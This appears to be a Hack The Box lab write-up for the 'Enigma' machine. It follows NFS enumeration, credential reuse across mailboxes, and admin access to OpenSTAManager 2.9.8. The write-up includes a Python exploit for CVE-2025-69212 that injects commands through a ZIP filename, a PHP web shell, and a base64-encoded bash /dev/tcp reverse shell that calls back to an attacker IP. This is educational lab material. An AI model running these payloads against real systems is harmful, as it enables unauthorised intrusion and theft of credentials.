## 1. Reconnaissance & Discovery
### 1.1 Connect to Hack The Box

First, download your personalized `.ovpn` file from Hack The Box.

Connect to the HTB VPN using the `.ovpn` configuration file. This establishes a secure tunnel that allows access to the target machine’s internal network.

Command: `sudo openvpn your_file.ovpn`

Start the Machine.

### 1.2 Verify Target is Reachable

Verify that the target machine is up and reachable by performing an ICMP ping test.

**Command:** `ping -c 4 TARGET_IP`

**Breakdown:**

- `-c 4` → sends 4 packets only (clean output, fast)

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
└─$ ping -c 4 TARGET_IP 
PING TARGET_IP (TARGET_IP) 56(84) bytes of data.
64 bytes from TARGET_IP: icmp_seq=1 ttl=63 time=226 ms
64 bytes from TARGET_IP: icmp_seq=2 ttl=63 time=223 ms
64 bytes from TARGET_IP: icmp_seq=3 ttl=63 time=220 ms
64 bytes from TARGET_IP: icmp_seq=4 ttl=63 time=221 ms

--- TARGET_IP ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 220.106/222.527/225.675/2.151 ms
```

A successful response confirms that the machine is active and accessible on the HTB network, allowing us to proceed with the enumeration phase.

## 2. Enumeration

### 2.1 Port Scan with Nmap

Before we can attack a system, we need to find out what "doors" are open. Doors in this context are ports. We use a tool called **Nmap** (Network Mapper) to scan the target's IP address and see what services are running.

#### 2.1.1 Full Port Sweep

Begin enumeration by discovering every open port on the target. Run a fast scan across all 65,535 ports to build a complete picture of the attack surface before committing to deeper inspection.

**Command:** `nmap -p- --min-rate 5000 -Pn TARGET_IP`

**Breakdown:**

- **`nmap`**
    - **Description:** The utility itself.
- **`-p-`**
    - **Description:** All Ports Scan. 
    - **Purpose:** Scans all 65,535 ports. Slower but thorough.
- `--min-rate 5000`
	- **Description:** Minimum Packet Rate.
	- **Purpose:** Forces Nmap to send at least 5,000 packets per second. This reduces scan time on stable networks like the HTB VPN.
- `-Pn`
    - **Description:** Skip Host Discovery.
    - **Purpose:** Treats the host as "online" even if it doesn't respond to pings (ICMP). Many HTB boxes have firewalls that block pings.
- **`TARGET_IP`**
    - **Description:** Target Specification.
    - **Purpose:** The IP address of the host being scanned.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
└─$ nmap -p- --min-rate 5000 -Pn TARGET_IP

</div>

#### 2.1.2 The "Deep Dive" Scan (Targeted Aggression)

**Command:** `nmap -A -p p1,p2,p3,p4 TARGET_IP`

**Breakdown:**

- **`-A`**
    - **Description:** Aggressive Scan Mode.
    - **Purpose:** Enables OS detection, version detection, script scanning (`-sC`), and traceroute all at once.
- `-p`
    - **Description:** Targeted Port List.
    - **Purpose:** Restricts the heavy scanning to only the ports you confirmed are open, saving significant time and processing power.


**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]

Your shouldn't scan those "unknown" high ports (39345, 43875, 45607, etc.). They are dynamically assigned NFS/RPC helper ports (`mountd`, `nlockmgr`, `status`) that change on every reboot. Scanning them deeply in `-A` mode adds noise and scan time with zero extra value, since:

1. They're not independently exploitable — they only exist to support the NFS service already on 2049.
2. Their port numbers will be different next time the box restarts anyway.
3. `-A` on them just returns more RPC version info you already have from the `rpcinfo` block on port 111.

They're commonly called **"high ports"** (or "ephemeral ports"), referring to any port number in the upper range, typically **above 1023** (and often more specifically **above 49152** for the formally reserved "dynamic/private" range per IANA). In practice, the term "high port" is used loosely by pentesters to mean "anything way above the well-known 0-1023 range that looks randomly assigned rather than tied to a standard service."

In your case, ports like `39345`, `43875`, `45607` etc. fall into this category for a specific reason: they're **ephemeral RPC ports**, dynamically allocated by `rpcbind` each time an RPC-based service (like NFS's `mountd`, `nlockmgr`, `status`) starts up. They aren't "well-known" or fixed — that's exactly why they show up as `unknown` in a plain `nmap -sV` scan and need `rpcinfo` (which `-A` includes) to identify what they actually belong to.

### 2.2 Web Service Enumeration

#### 2.2.1. Hostname Resolution

Before the web service can be accessed properly, the target's hostname needs to be mapped to its IP address locally. Without this, any attempt to browse to `enigma.htb` will fail to resolve — even though we already know the IP from our scan.

Add the mapping to your local hosts file:

**Command:** `echo "TARGET_IP enigma.htb" | sudo tee -a /etc/hosts`

**Breakdown:**

- `echo "TARGET_IP enigma.htb"`
    - **Description:** Prints the hostname mapping string to stdout.
    - **Purpose:** Prepares the entry to be written into `/etc/hosts`.
- `sudo tee -a /etc/hosts`
    - **Description:** Appends stdin to `/etc/hosts` with elevated privileges while also printing it to the terminal.
    - **Purpose:** `/etc/hosts` is root-owned, so a standard redirect would fail. Piping into `sudo tee -a` correctly elevates only the write operation without opening a full root shell.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
└─$ echo "TARGET_IP enigma.htb" | sudo tee -a /etc/hosts
TARGET_IP enigma.htb

┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
└─$ cat /etc/hosts                        
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
TARGET_IP enigma.htb
```

The system should now now resolve `enigma.htb` to `TARGET_IP` locally, allowing the web service to be accessed by hostname as intended. With that in place, the next step is to browse to the web service and inspect what's running on port 80.

<br>
<br>
</div>

#### 2.2.2. Initial Web Recon

With the hostname now resolving correctly, browse to `http://enigma.htb` in your browser to inspect what the web service is presenting.

![[enigma.htb.png]]


**Result:**

The page loads a polished corporate marketing site for **Enigma Corp**, presenting itself as a managed IT services company. Scrolling through the page reveals the following:

- A hero section advertising "Enterprise IT. Without the stress."
- A stats bar showing company metrics (3,800+ infrastructures managed, 12,000+ systems monitored)
- A services section listing: Managed IT Support, Hardware & Software Maintenance, On-Site Technical Assistance, Security & Compliance, Cloud Infrastructure, and Analytics & Reporting
- A contact section disclosing a support email address: **[support@enigma.htb](mailto:support@enigma.htb)**
- A footer with standard company links (About, Careers, Blog, Contact)

From an attacker's perspective, this page is mostly decorative — there are no visible login forms, file upload fields, or dynamic parameters in the URL. The page is entirely static HTML and client-side JavaScript with no obvious interactive backend to probe directly.

The one piece of actionable intelligence is the email address `support@enigma.htb`, which confirms the domain being used for internal mail. Combined with the open POP3/IMAP ports discovered during the Nmap scan, this reinforces that the mail services are the more promising avenue to explore next rather than the web surface itself.

At this stage we have two open threads worth pursuing: the mail services (POP3/IMAP on ports 110, 143, 993, 995) and the NFS share (port 2049). **POP3 and IMAP are email protocols** — they're the mechanism that allows a mail client (like Outlook) to connect to a mail server and retrieve messages from a mailbox. **NFS (Network File System) is a file-sharing protocol** — it allows a server to expose folders on its filesystem to other machines on the network, similar to a shared drive in an office environment.

The email address `support@enigma.htb` tells us that the mail infrastructure is active and in use — someone is sending and receiving mail on this domain. However, to interact with a mailbox we need credentials first. We don't have any yet.

This is where the NFS share becomes the priority. NFS shares — particularly ones named something like "onboarding" — are commonly used inside corporate environments to distribute files to new employees before they have full system access. If this share is world-readable (i.e. accessible without authentication, which the `*` wildcard in a `showmount` export list would confirm), it could contain exactly the kind of internal documentation that gets handed to a new hire on their first day — things like welcome letters, system access guides, or initial login credentials.

In other words, the NFS share is the likely source of the credentials we need to get into the mail service. That's why we will pivot there first — not because the mail service isn't interesting, but because we need a key before we can open that door.

### 2.3 NFS Share Enumeration

`showmount` is a command-line utility that queries an NFS server and asks it **"what are you sharing, and with whom?"** It communicates with the `rpcbind` service (port 111) on the target to retrieve the server's export list — the list of directories it has made available to other machines on the network.

Think of it like walking up to a shared filing cabinet in an office and checking the label on the outside before opening it — you're not accessing anything yet, just finding out what's there and whether it's locked.

It's typically one of the first commands you run when you spot NFS (port 2049) open on a target, since there's no point attempting a mount until you know:

1. **What** directories are being shared
2. **Who** is allowed to access them (the `*` wildcard meaning anyone, a specific IP, or a subnet)

**Command:** `showmount -e TARGET_IP`

**Breakdown:**

- `-e`
    - **Description:** Displays the NFS server's export list — the directories it is making available to other machines on the network.
    - **Purpose:** Before attempting to mount anything, we need to know what the server is actually sharing and whether any access restrictions are in place. This is the standard first step when NFS is identified on a target.
- `TARGET_IP`
    - **Description:** The target IP address.
    - **Purpose:** Directs the query at the Enigma host's NFS service identified on port 2049 during the Nmap scan.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
└─$ showmount -e TARGET_IP
Export list for TARGET_IP:
/srv/nfs/onboarding *
```

The server is exporting a single directory: `/srv/nfs/onboarding`. The `*` alongside it is significant — in NFS, this wildcard means the share is available to **any host** with no IP-based restrictions whatsoever. No authentication, no allowlist, no restrictions. Anyone on the network can mount it.

The name "onboarding" is also immediately interesting. In a corporate environment, an onboarding share is exactly the kind of place an IT department would drop welcome documents, system access guides, and initial credentials for new employees. This lines up directly with our earlier reasoning — this share is almost certainly the source of the credentials we need to access the mail service.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

With the export path and access policy confirmed, the next step is to create a local mount point and attach the remote share to it so its contents can be inspected directly from our machine.

**Command:** `mkdir -p /tmp/nfs_mount`

**Breakdown:**

- `mkdir`
    - **Description:** Creates a new directory.
    - **Purpose:** Creates the local folder that the remote NFS share will be attached to.
- `-p`
    - **Description:** Creates parent directories as needed and suppresses errors if the directory already exists.
    - **Purpose:** Ensures the command succeeds cleanly regardless of whether `/tmp/nfs_mount` already exists on the system.
tl
With the mount point ready, attach the remote share:

**Command:** `sudo mount -t nfs TARGET_IP:/srv/nfs/onboarding /tmp/nfs_mount -o nolock`

**Breakdown:**

- `-t nfs`
    - **Description:** Specifies the filesystem type as NFS.
    - **Purpose:** Tells the mount command exactly which protocol driver to use rather than attempting to guess from the source path.
- `TARGET_IP:/srv/nfs/onboarding`
    - **Description:** The remote export path in `HOST:PATH` format.
    - **Purpose:** Targets the specific share confirmed available in the previous `showmount` query.
- `/tmp/nfs_mount`
    - **Description:** The local directory to mount the share into.
    - **Purpose:** The local access point through which the share's contents will be readable.
- `-o nolock`
    - **Description:** Disables NFS file locking.
    - **Purpose:** Prevents the mount from hanging or failing due to the NFS lock manager not being reachable — a common issue on CTF infrastructure where file locking isn't needed anyway.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
└─$ sudo mount -t nfs TARGET_IP:/srv/nfs/onboarding /tmp/nfs_mount -o nolock
[sudo] password for kali: 
```

Now list the contents of the mounted share:

**Command:** `ls -la /tmp/nfs_mount`

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
└─$ ls -la /tmp/nfs_mount 
total 8
drwxr-xr-x  2 root root 4096 Feb 19 19:54 .
drwxrwxrwt 18 root root  440 Jun 30 23:16 ..
-rw-r--r--  1 root root 1751 Feb 19 19:53 New_Employee_Access.pdf
```

The share contains a single file: `New_Employee_Access.pdf`. The permissions (`-rw-r--r--`) confirm it is world-readable — any user can open it without needing root access. The filename itself is immediately telling: this is exactly the kind of document an IT department would generate for a new employee, and it very likely contains the initial system credentials we've been looking for.

</div>

### 2.4 Extracting Credentials from the Onboarding Document

The PDF can be viewed directly in the browser by navigating to `file:///tmp/nfs_mount/New_Employee_Access.pdf` since the share is mounted locally. This gives a clean, readable view of the document exactly as it would appear to the intended recipient. 

![[New_Employee_Access.pdf.png]]

For documentation purposes however, the contents are also extracted to the terminal using `pdftotext`.

**Command:** `pdftotext /tmp/nfs_mount/New_Employee_Access.pdf -`

**Breakdown:**

- `pdftotext`
    - **Description:** A command-line utility that extracts text content from a PDF file.
    - **Purpose:** Allows the PDF contents to be read and documented directly in the terminal without needing a GUI application.
- `/tmp/nfs_mount/New_Employee_Access.pdf`
    - **Description:** The path to the PDF file on the locally mounted NFS share.
    - **Purpose:** Targets the onboarding document discovered in the previous step.
- `-`
    - **Description:** Instructs `pdftotext` to write its output to stdout (the terminal) instead of saving it to a file.
    - **Purpose:** Keeps the output inline and immediately visible rather than creating an intermediate file on disk.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
└─$ pdftotext /tmp/nfs_mount/New_Employee_Access.pdf -

Password:

Enigma2024!

Please change your password upon first login.
For support contact: it@enigma.htb
This document contains confidential internal information intended solely for the recipient.
Unauthorized access, disclosure, or distribution is strictly prohibited.
Generated automatically by Enigma Corp Identity Management System.
```

The document is an automatically generated IT provisioning notice for a new employee — **Kevin Mitchell** from the Operations department. It contains his initial webmail credentials:

|Field|Value|
|---|---|
|URL|`http://mail001.enigma.htb`|
|Username|`kevin`|
|Password|`Enigma2024!`|

Two additional details are worth noting. First, the support contact (`it@enigma.htb`) confirms an internal IT team is actively managing this environment. Second, the document was generated by an **"Identity Management System"** — suggesting credentials across the organisation may follow a similar pattern or provisioning process, which could be relevant if password reuse is in play.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

Before proceeding, `mail001.enigma.htb` is a new hostname that needs to be added to `/etc/hosts`, otherwise the webmail URL won't resolve:

**Command:** `echo "TARGET_IP mail001.enigma.htb" | sudo tee -a /etc/hosts`

The hostname is now resolvable. `mail001.enigma.htb` will correctly direct to the target IP, allowing us to interact with the mail service using the hostname rather than the raw IP — which matters here since the webmail URL in the onboarding document explicitly uses this hostname.

<br>
</div>

### 2.5 Accessing Kevin's Mailbox

Browsing to `http://mail001.enigma.htb` reveals a **Roundcube Webmail** login page — confirming this is the webmail interface referenced in the onboarding document. 

![[Pasted image 20260701024642.png]]

Logging in with Kevin's credentials (`kevin` / `Enigma2024!`) lands us in his inbox, which shows a single email from `sarah@enigma.htb` with the subject "Welcome to Enigma Corp, Kevin!".

![[Pasted image 20260701025234.png]]

![[Pasted image 20260701030156.png]]

While the browser gives us a clean visual view of the inbox, the same mailbox is also accessed directly via the terminal using `openssl s_client` against the POP3S service. This approach is more useful for documentation and automation purposes.

**Command:** `openssl s_client -connect mail001.enigma.htb:995 -quiet << 'EOF'`

**Breakdown:**

- `openssl s_client`
    - **Description:** OpenSSL's built-in generic SSL/TLS client — essentially a raw TCP client that wraps the connection in TLS.
    - **Purpose:** Port 995 (POP3S) requires TLS from the moment the connection opens, so a plain terminal tool like `nc` won't work here. `openssl s_client` handles the TLS handshake transparently and then lets us type raw POP3 commands as if it were a regular text connection.
- `-connect mail001.enigma.htb:995`
    - **Description:** Specifies the target host and port to connect to.
    - **Purpose:** Directs the connection to the POP3S service on the mail server.
- `-quiet`
    - **Description:** Suppresses the verbose TLS handshake and certificate output.
    - **Purpose:** Keeps the terminal output focused on the actual POP3 dialogue rather than pages of TLS negotiation details — though note the self-signed certificate warning still surfaces since `-quiet` doesn't fully suppress verification errors.
- `<< 'EOF' ... EOF`
    - **Description:** A bash heredoc — a way of feeding multiple lines of input into a command all at once.
    - **Purpose:** Allows the full POP3 conversation (`USER`, `PASS`, `LIST`, `RETR`, `QUIT`) to be scripted in one go rather than typed interactively line by line.
- `USER kevin` / `PASS Enigma2024!`
    - **Description:** Standard POP3 authentication commands.
    - **Purpose:** Authenticates to the mail server using the credentials recovered from the onboarding PDF.
- `LIST`
    - **Description:** Requests a list of all messages in the mailbox along with their sizes.
    - **Purpose:** Confirms how many emails are present before retrieving any.
- `RETR 1`
    - **Description:** Retrieves the full content of message number 1.
    - **Purpose:** Reads the only email present in Kevin's inbox.
- `QUIT`
    - **Description:** Closes the POP3 session cleanly.
    - **Purpose:** Terminates the connection properly rather than leaving it hanging.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]

Hi Kevin,

Welcome to the team! We're thrilled to have you on board at Enigma Corp.

A little about us — Enigma Corp is a mid-sized technology and operations firm specializing in infrastructure management and enterprise solutions. We've been growing rapidly over the past few years and we're excited to have fresh talent joining us.

I'm Sarah from the Accounts department. I'll be your point of contact for any finance-related queries during your onboarding period.

We're still finalizing a few of your onboarding details — your system access, equipment setup, and department introductions are all being arranged by the IT team. You should be receiving your access credentials shortly via the company shared drive.

In the meantime, don't hesitate to reach out if you have any questions. We want to make sure your first few days are as smooth as possible.

Looking forward to working with you!

Best regards,
Sarah
Accounts Department
Enigma Corp

+OK Logging out.
```

Kevin's inbox contains a single email — a welcome message sent by **Sarah** from the Accounts department (`sarah@enigma.htb`). The email itself doesn't contain any credentials, but it does introduce a new person of interest. Sarah mentions that Kevin's access credentials will be arriving "via the company shared drive" — which we've already accessed via the NFS share, confirming that chain was the intended path.

More importantly, we now have a second internal username: `sarah`. Given that Kevin's password (`Enigma2024!`) appears to have been auto-generated by the Identity Management System referenced in the onboarding PDF, it's reasonable to ask: was the same password provisioned for other accounts? This is a classic **password reuse** scenario — and the next logical step is to test whether Sarah's account uses the same credential.

### 2.6 Password Reuse Confirmed — Accessing Sarah's Mailbox

The same credential used for Kevin's account can now be tested against Sarah's mailbox. Since both accounts were provisioned by the same IT Identity Management System — and the onboarding document explicitly warned _"Please change your password upon first login"_ — it's worth checking whether Sarah followed that instruction. Run the following command to attempt authentication as Sarah using Kevin's password:

**Command:** `openssl s_client -connect mail001.enigma.htb:995 -quiet << 'EOF'`

**Breakdown:**

- `USER sarah` / `PASS Enigma2024!`
    - **Description:** POP3 authentication commands using Sarah's username with Kevin's provisioned password.
    - **Purpose:** Tests whether the same default password was reused across multiple accounts — a common misconfiguration in environments where passwords are auto-generated and never changed.
- All other flags and commands are identical to the previous step — refer to Section 2.6 for their full breakdown.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]

Hi Sarah,

Apologies for the delay. I have provisioned your access. Please find the details below:

URL: http://support_001.enigma.htb
Username: admin
Password: Ne3s4rtars78s

Note: I will create a dedicated account for you shortly, for now you can use the admin account to get started.

Regards,
IT Support
Enigma Corp

.
+OK Logging out.
```

![[Pasted image 20260701031401.png]]

The login succeeds — Sarah never changed her provisioned password, confirming credential reuse. Reading her inbox reveals a single email from the IT department containing admin credentials for an internal application called **OpenSTAManager** at `http://support_001.enigma.htb`.

Take note of the following credentials:

|Field|Value|
|---|---|
|URL|`http://support_001.enigma.htb`|
|Username|`admin`|
|Password|`Ne3s4rtars78s`|
<div align="center">
<br>

<br>
<br>
</div>

### 2.7 Registering the OpenSTAManager Hostname

Before navigating to that URL, the new hostname needs to be registered in `/etc/hosts` — otherwise the address won't resolve. Add it now:

**Command:** `echo "TARGET_IP support_001.enigma.htb" | sudo tee -a /etc/hosts`

The hostname is now registered. Browsing to `http://support_001.enigma.htb` confirms the application is running and presents an **OpenSTAManager** login page. 

![[Pasted image 20260701031952.png]]

OpenSTAManager is an open-source business management and technical assistance platform — commonly used by IT support teams to manage invoices, contracts, and customer tickets.

### 2.8 OpenSTAManager Admin Access Confirmed

Go ahead and log in using the admin credentials recovered from Sarah's mailbox (`admin` / `Ne3s4rtars78s`).

Logging in with the credentials recovered from Sarah's mailbox (`admin` / `Ne3s4rtars78s`) grants immediate access to the OpenSTAManager dashboard. The interface presents a full business management panel with modules for Entities, Email Settings, Documents Management, Tasks, Sales, Purchases, Accounting, Storage, Plants, Stats, Maps, and Tools visible in the left sidebar.
<div align="center">

### 2.9 Version Fingerprinting

Once inside, the first thing to do is locate the application's version number — this will be needed to identify whether any known vulnerabilities apply. Look closely at the **bottom right corner** of the dashboard — the version number is already visible: ==**Version 2.9.8 (d1t5d9b)**==.

![[Pasted image 20260701034026.png]]

This is an important finding. Knowing the exact version allows us to search for known vulnerabilities specific to this release. Take note of it and then click the **"i" (Information) icon** in the top-right toolbar to confirm the version details on the dedicated information page.

### 3.1 Vulnerability Research & Exploit Identification

With an exact version confirmed, the next step is to research whether any known vulnerabilities exist for this release.

Searching for **"OpenSTAManager Version 2.9.8 CVE"** returns a number of results across NVD, CVE Details, Sploitus, and Vulners. The search results reveal that version 2.9.8 is affected by multiple vulnerabilities

#### CVE-2025-69212

| Field                   | Detail                                               |
| ----------------------- | ---------------------------------------------------- |
| CVE ID                  | CVE-2025-69212                                       |
| Type                    | OS Command Injection                                 |
| Affected Versions       | 2.9.8 and earlier                                    |
| Location                | P7M (signed XML) file decoding functionality         |
| Authentication Required | Yes — admin access needed                            |
| Impact                  | Arbitrary OS command execution on the hosting server |

**How the flaw works:** The application allows uploading a ZIP file containing a `.p7m` invoice file for processing. When the ZIP is extracted, the filename of the `.p7m` file is passed directly to a system command without sanitisation. By crafting a malicious filename containing shell metacharacters, the intended command can be broken out of and arbitrary commands injected in its place.

**Remediation (for reference):** The vendor advisory recommends upgrading to version 2.9.9 or later where the filename is properly sanitised before being passed to the system command.

Since we have admin credentials and the target is running version 2.9.8, all conditions for exploitation are met. The next step is to craft the malicious ZIP payload. Move to your terminal and we'll build it now.

## 3. Web Exploitation (Foothold)

### 3.1 Crafting the Malicious Payload

Create the exploit generator script:

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
└─$ vi genex.py  

┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
└─$ cat genex.py
```

```python
import zipfile

cmd = 'cd files && echo \'<?php system($_GET["c"]); ?>\' > SHELL.php'
malicious_filename = f'invoice.p7m";{cmd};echo ".p7m'

with zipfile.ZipFile('exploit.zip', 'w') as zf:
    zf.writestr(malicious_filename, b"DUMMY_P7M_CONTENT")
```

**Breakdown:**

**`import zipfile`**  
Imports Python's built-in ZIP file library. This is what allows us to create and write ZIP archives directly from Python without needing any external tools.

**`cmd = 'cd files && echo \'<?php system($_GET["c"]); ?>\' > SHELL.php'`**  
This is the actual command we want the server to execute. Breaking it down further:

- `cd files` — moves into OpenSTAManager's publicly accessible `files/` directory, which is reachable via the web server
- `&&` — only runs the next command if the first one succeeded
- `echo '<?php system($_GET["c"]); ?>' > SHELL.php` — writes a minimal one-line PHP web shell into that directory. The shell accepts a command via the `c` GET parameter and executes it on the server using PHP's `system()` function

**`malicious_filename = f'invoice.p7m";{cmd};echo ".p7m'`**  
This is the heart of the exploit — the injected filename. When OpenSTAManager receives this filename and passes it unsanitised to a system command, the following happens:

- `invoice.p7m"` — closes the expected filename string with a `"`
- `;` — ends the original command
- `{cmd}` — injects our shell command
- `;echo "` — chains another command to cleanly re-open the string
- `.p7m` — closes the string back to something that looks like a normal `.p7m` extension, preventing an immediate crash

**`with zipfile.ZipFile('exploit.zip', 'w') as zf:`**  
Creates a new ZIP file called `exploit.zip` in write mode. The `with` block ensures the file is properly closed and finalised once writing is complete.

**`zf.writestr(malicious_filename, b"DUMMY_P7M_CONTENT")`**  
Writes an entry into the ZIP archive using our malicious string as the filename. The actual file content (`DUMMY_P7M_CONTENT`) is irrelevant — it's just a placeholder to make the ZIP valid. The application will error when trying to parse it as XML, but the command injection in the filename fires before that error occurs.

**`print("[+] exploit.zip created")`**  
Confirms the script ran successfully and the ZIP file is ready to upload.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

Run `genex.py`.

**Command:** `python3 genex.py`

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
└─$ python3 genex.py       
[+] exploit.zip created

┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
└─$ ls
exploit.zip  genex.py
```

`exploit.zip` is now ready to be delivered to the target. The next step is to authenticate to OpenSTAManager and upload the ZIP through the Importazione FE module. This can be done either through the browser UI or scripted via `curl`.

**Browser Method:**

In your OpenSTAManager dashboard, navigate to:

**Sales → Invoices → Importazione FE**

You should see a file upload form with a **"Carica documenti"** (Upload Documents) button.

1. Click **"Choose File"**
2. Navigate to and select your `exploit.zip` file
3. Click **"Carica documenti"** to upload

![[Pasted image 20260701102411.png]]

![[Pasted image 20260701102421.png]]

**Result:**

The application responds with an error dialog: **"Start tag expected, '<' not found"**. This is the same XML parsing error encountered previously and is entirely expected — it means the application successfully extracted the ZIP, attempted to parse the dummy file content as XML, and failed because `DUMMY_P7M_CONTENT` is not valid XML.

This error is a red herring. What matters is not whether the XML parsed correctly, but whether the injected filename command fired during the extraction step — which happens before the XML parsing even begins. The error actually confirms the file was processed far enough for the injection to have triggered.

### 3.2 Web Shell Confirmed

**Command:** `curl "http://support_001.enigma.htb/files/SHELL.php?c=id"`

**Breakdown:**

- `http://support_001.enigma.htb/files/SHELL.php`
    - **Description:** The path to the PHP web shell written by the injected filename command during the upload's processing step.
    - **Purpose:** Confirms the file was created on disk and is being served by the web server, despite the XML parsing error shown in the UI.
- `?c=id`
    - **Description:** Query parameter consumed by `system($_GET["c"])` inside the web shell.
    - **Purpose:** Executes the `id` command — a safe, non-destructive test that simply returns the current user context, confirming code execution without causing any damage or triggering anything irreversible.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
└─$ curl "http://support_001.enigma.htb/files/SHELL.php?c=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The web shell is alive and executing commands on the server as `www-data` — the user that the nginx/PHP web service runs as. This confirms that **CVE-2025-69212 was successfully exploited** and we have arbitrary command execution on the target.

To summarise what just happened:

### 3.3 Establishing a Reverse Shell

With code execution confirmed, the next step is to upgrade from a one-shot web shell to a fully interactive reverse shell. This requires two terminals running simultaneously — one to listen for the incoming connection, and one to trigger the payload.

**Terminal 1 — Start the Listener**

**Command:** `nc -lvnp 80`

**Breakdown:**

- `-l`
    - **Description:** Listen mode — instructs netcat to wait for an incoming connection rather than initiating one.
    - **Purpose:** Sets up the receiver on our end that will catch the shell when the target connects back.
- `-v`
    - **Description:** Verbose output.
    - **Purpose:** Prints connection status messages so we can see when the target connects.
- `-n`
    - **Description:** Numeric-only mode — disables DNS resolution.
    - **Purpose:** Prevents netcat from attempting to resolve hostnames, keeping the connection faster and cleaner.
- `-p 80`
    - **Description:** Specifies the port to listen on.
    - **Purpose:** Port 80 is used here specifically because egress testing earlier confirmed the target is permitted to make outbound connections on port 80. Higher ports like 4444 were silently blocked by the target's firewall.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
└─$ nc -lvnp 80  
listening on [any] 80 ...
```

The listener is up and waiting. Leave this terminal open and move to Terminal 2.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

**Terminal 2 — Generate the Payload**

**Command:** `echo 'bash -i >& /dev/tcp/10.10.15.227/80 0>&1' | base64 -w0`

**Breakdown:**

- `bash -i >& /dev/tcp/10.10.15.227/80 0>&1`
    - **Description:** A Bash reverse shell one-liner using `/dev/tcp` — a built-in Bash feature that opens a raw TCP connection to a specified host and port.
    - **Purpose:** When executed on the target, this opens a connection back to our listener on port 80 and redirects the shell's input and output through that connection, giving us an interactive terminal on the remote machine.
- `| base64 -w0`
    - **Description:** Pipes the shell command through base64 encoding with no line wrapping (`-w0`).
    - **Purpose:** The raw reverse shell contains special characters (`>&`, `&`) that would be misinterpreted or mangled when passed through a URL query parameter. Base64 encoding converts it to a safe alphanumeric string that survives the HTTP request intact.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
└─$ echo 'bash -i >& /dev/tcp/10.10.15.227/80 0>&1' | base64 -w0
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yMjcvODAgMD4mMQo=
```

This is the base64-encoded reverse shell payload.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

Why Do we encode the payload?

It comes down to two problems that special characters cause:

**Problem 1: URL interpretation**

When you put a command like `bash -i >& /dev/tcp/10.10.15.227/80 0>&1` into a URL, certain characters have special meanings in HTTP:

|Character|What HTTP thinks it means|
|---|---|
|`&`|Separates multiple query parameters|
|`>`|Not valid in a URL at all|
|`/`|Path separator|
|`=`|Separates a parameter name from its value|

So a URL like `?c=bash -i >& /dev/tcp/...` would arrive at the server completely broken — the `&` would be interpreted as the start of a second parameter, splitting your command in half before it ever reaches PHP.

**Problem 2: Shell interpretation**

Even if the URL survived intact, the shell on the server side might misinterpret the redirections (`>&`, `0>&1`) depending on how PHP's `system()` spawns the subprocess.

**Base64 sidesteps both problems entirely** because the base64 character set only uses letters, numbers, `+`, `/`, and `=` — and `--data-urlencode` handles those safely. The encoded string travels as a clean, unambiguous blob, and the decoding (`base64 -d | bash`) happens entirely on the server side after it arrives, where the special characters are no longer inside a URL.

Think of it like putting a letter in an envelope — the envelope (base64) travels safely through the postal system (HTTP), and only gets opened (decoded) once it reaches its destination (the server).

### 3.4 ## Reverse Shell Established

**Command:** `curl --get --data-urlencode "c=echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yMjcvODAgMD4mMQo=|base64 -d|bash" "http://support_001.enigma.htb/files/SHELL.php"`

**Breakdown:**

- `--get`
    - **Description:** Forces curl to send the request as HTTP GET, appending the data as a query string rather than a POST body.
    - **Purpose:** Critical — the web shell reads `$_GET["c"]` exclusively, so sending as POST would silently deliver the payload to a parameter the script never reads, resulting in no execution.
- `--data-urlencode "c=echo YmFzaC...|base64 -d|bash"`
    - **Description:** URL-encodes the full command string and appends it to the query string as the `c` parameter.
    - **Purpose:** Safely encodes the pipe characters and spaces in the command so they survive the HTTP request intact and arrive at the server exactly as intended.

**Result — Terminal 1 (curl):**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
└─$ curl --get --data-urlencode "c=echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yMjcvODAgMD4mMQo=|base64 -d|bash" \

```

**Result — Terminal 2 (listener):**

We have an **interactive shell on the target machine as www-data**. The foothold is complete.

## 4. Lateral Movement to `haris`

### 4.1 Database Credential Extraction

Read the application's configuration file directly from the web directory to recover the database credentials stored inside it.

**Command:** `cat /var/www/html/openstamanager/config.inc.php`

**Breakdown:**

- `cat`
    - **Description:** Prints the contents of a file to the terminal.
